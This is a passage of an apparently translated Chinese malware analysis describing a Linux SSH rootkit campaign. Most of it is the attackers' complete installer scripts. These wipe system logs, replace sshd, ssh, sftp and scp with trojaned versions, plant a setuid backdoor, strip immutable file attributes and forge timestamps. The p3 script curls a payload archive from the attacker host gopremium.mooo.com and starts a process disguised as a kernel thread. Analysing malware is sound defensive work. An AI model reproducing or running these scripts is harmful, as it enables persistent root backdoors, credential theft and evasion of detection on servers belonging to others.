最后用木马版本覆盖SSH二进制文件，并更改时间戳：  
    /usr/sbin/sshd, /usr/bin/ssh, /usr/bin/sftp, /usr/bin/scp
脚本内容：
    #!/bin/bash
    # echo -e "33[0;31m [-] 33[0m33[0m" # red# echo -e "33[0;32m [+] 33[0m33[0m" # green# echo -e "33[0;36m xxx 33[0m33[0m" #cyan
    if [ $# != 2 ]; then good=0 ; fi
    if [ "$1" == "test" ] ; then
     test=1
    elif [ "$1" == "install" ] ; then
     install=1else
     good=0
    fi
    if [ "$good" = "0" ] ; then
     echo
            echo -e "33[0;31m $0 [test | install] [rk kit] 33[0m33[0m" # red
            echo -e "33[0;36m example: $0 test 2centos6-32bits 33[0m33[0m" #cyan
     echo
     exit
    fi
    if [ ! -s "$2" ] ; then 
     echo
     echo -e "33[0;31m $2 is not a valid rk kit 33[0m33[0m" # red
     echo
     exit
    fi
    ### verificam daca e instalat ce folosim
    DEP=('/usr/bin/curl''/bin/sed''/usr/bin/gcc'
    )for t in "${DEP[@]}" ; do
            if [ -f $t ] ; then
                    echo -ne "33[0;32m [+] 33[0m33[0m" # green
                    echo "$t - found"
            else
                    echo -ne "33[0;31m [-] 33[0m33[0m" # red
                    echo "$t - MISSING OR EMPTY"
                    good=0
            fi
    doneif [ "$good" = "0" ] ; then echo "Some files are missing or empty. Existing." ; echo ; exit ; fi
    ######## golim logurile de pe server - pe viitor tb gasita alta varianta> /var/log/messages> /var/log/secure> /var/log/lastlog> /var/log/wtmp# EOF golim logurile de pe server - pe viitor tb gasita alta varianta
    ######## facem directorul si fiserul de unde luam timestamp si facem functia
    mkdir /usr/lib/libu.a/ 2>/dev/null
    echo "timestamp" > /usr/lib/libu.a/TS04840203583
    touch -r /usr/sbin/sshd /usr/lib/libu.a
    touch -r /usr/sbin/sshd /usr/lib/libu.a/TS04840203583
    luam_timestamp() {
      touch -r /usr/lib/libu.a/TS04840203583 $1
      }####### EOF facem directorul si fiserul de unde luam timestamp si facem functia
    ########################################## test partif [ "$test" = "1" ] ; then
     # echo "doing test"
     if [ -s "$2/run-libcheck" ] ; then
      cd $2
      ./run-libcheck
      cd ..
     fi
     echo
     echo -e "33[0;36m [x] setting up permissions 33[0m33[0m" #cyan
     echo -ne "33[0;32m [+] 33[0m33[0m" ; echo "permision 400 for /etc/ssh/ssh_host*" ;  chmod 400 /etc/ssh/ssh_host*
     echo -ne "33[0;32m [+] 33[0m33[0m" ; echo "creating: /var/empty" ;  mkdir /var/empty 1>/dev/null 2>/dev/null
     echo
            echo -e "33[0;36m [x] moving sshd config files 33[0m33[0m" #cyan
                    echo -ne "33[0;32m [+] 33[0m33[0m" ; echo /etc/ssh/sshd_config
                            cp -f sshd_config /etc/ssh
       luam_timestamp /etc/ssh/sshd_config
                    echo -ne "33[0;32m [+] 33[0m33[0m" ; echo /etc/ssh/ssh_config
                            cp -f ssh_config /etc/ssh
       luam_timestamp /etc/ssh/ssh_config
     echo
     echo -e "33[0;36m [x] test ended. Now test the sshd :) 33[0m33[0m" #cyan
     cd $2
     rm -rf test-sshd ; cp sshd-eu test-sshd
     cd ..
     maindir=`pwd` ; workdir="$maindir/$2"
     echo " $workdir/test-sshd -p 65535"
     echo " telnet 127.0.0.1 65535 / ssh root@127.0.0.1 -p 65535"
     echo " killall -9 test-sshd"
     echo
     echo -e "33[0;36m [x] Daca totul e bine, ruleaza ./run install $2 33[0m33[0m" #cyan
     echo
    exit
    fi# EOF test part
    ########################################## install partif [ "$install" = "1" ] ; then
     echo
            echo -e "33[0;36m [x] creating sniffer files and main dir 33[0m33[0m" #cyan
      echo -ne "33[0;32m [+] 33[0m33[0m" ; echo "Creating: /etc/pps"
       mkdir /etc/pps ; chmod 777 /etc/pps/
       luam_timestamp /etc/pps
      echo -ne "33[0;32m [+] 33[0m33[0m" ; echo "Creating: /etc/X11/.pr"
       mkdir /etc/X11 ; chmod 777 /etc/X11/ ; > /etc/X11/.pr
       luam_timestamp /etc/X11/.pr
     echo
     echo -e "33[0;36m [x] creating goprem dir & file (suid) 33[0m33[0m" #cyan
      echo -ne "33[0;32m [+] 33[0m33[0m" ; echo "creating: /usr/include/arpa"
       mkdir /usr/include 1>/dev/null 2>/dev/null
       mkdir /usr/include/arpa 1>/dev/null 2>/dev/null
      echo -ne "33[0;32m [+] 33[0m33[0m" ; echo "gcc goprem.c & moving"
       gcc goprem.c -o goprem 2>/dev/null
       mv goprem /usr/include/arpa/
                            chown root:root /usr/include/arpa/goprem
                            chmod +s /usr/include/arpa/goprem
       luam_timestamp /usr/include/arpa/goprem
     echo
     echo -e "33[0;36m [x] getting permisions in 33[0m33[0m" #cyan
      echo -ne "33[0;32m [+] 33[0m33[0m" ; echo "/usr/sbin"
       chattr -R -aui /usr/sbin/ 1>/dev/null 2>/dev/null
      echo -ne "33[0;32m [+] 33[0m33[0m" ; echo "/usr/bin" 
       chattr -R -aui /usr/bin/ 1>/dev/null 2>/dev/null
      echo -ne "33[0;32m [+] 33[0m33[0m" ; echo "/bin"
       chattr -R -aui /bin/ 1>/dev/null 2>/dev/null
     echo
     echo -e "33[0;36m [x] replacing system files 33[0m33[0m" #cyan
      maindir=`pwd` ; workdir="$maindir/$2"
      echo -ne "33[0;32m [+] 33[0m33[0m" ; echo "saving server's sshd in /etc/pps/old-srvf/"
       mkdir /etc/pps/old-srvf ; cp /usr/sbin/sshd /etc/pps/old-srvf/old55hd
       luam_timestamp /etc/pps/old-srvf
       luam_timestamp /etc/pps/old-srvf/old55hd
      echo -ne "33[0;32m [+] 33[0m33[0m" ; echo "/usr/sbin/sshd"
       cp -f $workdir/sshd-eu /usr/sbin/sshd
       luam_timestamp /usr/sbin/sshd
      echo -ne "33[0;32m [+] 33[0m33[0m" ; echo "/usr/bin/ssh"
       cp -f $workdir/ssh /usr/bin/ssh
       luam_timestamp /usr/bin/ssh
      echo -ne "33[0;32m [+] 33[0m33[0m" ; echo "/usr/bin/sftp"
       cp -f $workdir/sftp /usr/bin/sftp
       luam_timestamp /usr/bin/sftp
      echo -ne "33[0;32m [+] 33[0m33[0m" ; echo "/usr/bin/scp"
       cp -f $workdir/scp /usr/bin/scp
       luam_timestamp /usr/bin/scp
     echo
     echo -e "33[0;36m [x] moving to the last step (sshd restart file) 33[0m33[0m" #cyan
     echo " mv s_res /tmp/.bla ; cd /tmp/.bla ; rm -rf rkkit*"
     echo " nohup ./s_res 1>/dev/null 2>/dev/null "
     echo " tar zxf side_files.tgz -C /etc/pps ; cd /etc/pps/side_files ; rm -rf /tmp/.bla"
     echo
    exit
    fi
    # EOF install part
**脚本4（p3）：**
****
该脚本是由脚本p2通过指令curl –progress-bar -O http://gopremium.mooo.com/…/auto/p3调用的。
同样的，这个脚本会从http://gopremium.mooo.com/…/auto/side_files.tgz  
调用一些其他工具。
在仔细研究附加脚本内容和其用处之前，我要先检查一下输出。
这里有几个值得注意的地方，但是最有趣的是最后一行显示了被入侵系统的所有信息以及主机IP。甚至还为该系统分配了一个独特的ID。网络罪犯们保存这样的信息是为了跟踪所有的入侵系统。
P3脚本的完整内容如下所示：
    #!/bin/bash
    ############## rkip install (p3)
    # echo -e "33[0;31m [-] 33[0m33[0m" # red
    # echo -e "33[0;32m [+] 33[0m33[0m" # green
    # echo -e "33[0;36m xxx 33[0m33[0m" #cyan
    os=`cat 1tempfiles/os.txt`
    rk=`cat 1tempfiles/rk.txt`
    side_files_dir=`cat 1tempfiles/side_files_dir.txt`
    maindir=`pwd`
    echo -e "33[0;32m [+] 33[0m33[0m downloading rkip" # green
    rm -rf side_files.tgz
    curl --progress-bar -O http://gopremium.mooo.com/.../auto/side_files.tgz
    if [ ! -f side_files.tgz ] ; then echo -e "33[0;31m [-] 33[0m33[0m file missing - download failed. aborting" ; echo ; exit ; fi
    echo -e "33[0;32m [+] 33[0m33[0m starting rkip install" # green
    if [ -z $side_files_dir ] ; then echo -e "33[0;31m [-] 33[0m33[0m no side_files_dir. aborting" ; echo ; exit ; fi
    rm -rf /etc/pps/side_files
    tar mzxf side_files.tgz ; rm -rf side_files.tgz ; cp -R side_files /etc/pps
    rkipdir="/etc/pps/side_files"
    cd $rkipdir ; yes y | ./install $side_files_dir 1>>$maindir/1tempfiles/log.rkip 2>>$maindir/1tempfiles/log.rkip
    node_process_id=$(pidof [pdflush-0])
    if [[ -z $node_process_id ]]; then
            #echo " nu exista"
            echo -e "33[0;31m [-] 33[0m33[0m background proccess did not start. aborting. check ($maindir/1tempfiles/log.rkip). script in /etc/pps/side_files"
            echo ; exit
    fi
    echo -e "33[0;32m [+] 33[0m33[0m rkip install done (logs in $maindir/1tempfiles/log.rkip)"
    echo -e "33[0;36m [x] 33[0m33[0m write this down in your notepad :)" #cyan